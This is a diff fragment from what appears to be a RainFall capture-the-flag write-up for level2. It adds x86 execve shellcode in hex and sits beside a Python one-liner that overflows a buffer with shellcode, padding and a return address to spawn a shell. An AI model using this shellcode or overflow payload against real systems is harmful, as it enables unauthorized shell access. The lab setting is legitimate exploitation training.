@@ -102,6 +102,9 @@ end
 
 ===
 
+shellcraft i386.linux.sh
+ 6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80
+
 level2@RainFall:~$ (python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
 
 pwd
